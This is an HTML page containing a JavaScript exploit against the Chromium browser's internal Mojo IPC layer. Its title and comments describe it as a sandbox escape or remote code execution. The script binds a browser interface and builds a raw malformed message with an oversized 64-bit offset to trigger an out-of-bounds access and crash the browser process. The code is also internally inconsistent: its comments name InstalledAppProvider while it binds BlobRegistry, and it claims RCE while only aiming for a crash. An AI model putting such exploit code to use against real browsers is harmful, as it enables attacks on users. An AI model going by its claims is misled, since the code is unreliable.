<!DOCTYPE html>
<html>
<head>
    <title>InstalledAppProvider RCE – Direct Bind</title>
</head>
<body>
    <h1>InstalledAppProvider Direct Bind – Sandbox Escape</h1>
    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
    <script>
    (async () => {
        const log = (msg) => {
            document.getElementById('log').textContent += msg + '\n';
            console.log(msg);
        };

        try {
            // 1. Get the browser interface provider (requires MojoJSTest)
            const provider = Mojo.getInterfaceProvider();
            log('Got interface provider');

            // 2. Bind InstalledAppProvider directly
            const handle = Mojo.bindInterface('blink.mojom.BlobRegistry', provider);
            log('Bound to InstalledAppProvider');

            // 3. Build the malicious FilterInstalledApps message
            const payload = new ArrayBuffer(64);
            const v = new DataView(payload);

            // Mojo message header (16 bytes)
            v.setUint32(0, 2, true);          // version
            v.setUint32(4, 0, true);          // flags
            v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
            v.setUint32(12, 0, true);         // request_id

            // Payload (starting at offset 16) – mimics the vulnerable parser
            // Offset 16: struct size (16) and version (0)
            v.setUint32(16, 16, true);
            v.setUint32(20, 0, true);
            // Offset 24: count must be >= 2 to trigger the offset path
            v.setUint32(24, 2, true);
            // Offset 32: 64-bit relative offset – set to a huge value to cause OOB
            v.setBigUint64(32, BigInt(0xFFFFFFFF), true);

            // 4. Send the raw message
            handle.writeMessage(payload, []);
            log('Malicious message sent! Browser process should crash now.');

            // Keep the page alive
            setInterval(() => {}, 10000);
        } catch (e) {
            log('Error: ' + e.message);
            console.error(e);
        }
    })();
    </script>
</body>
</html>
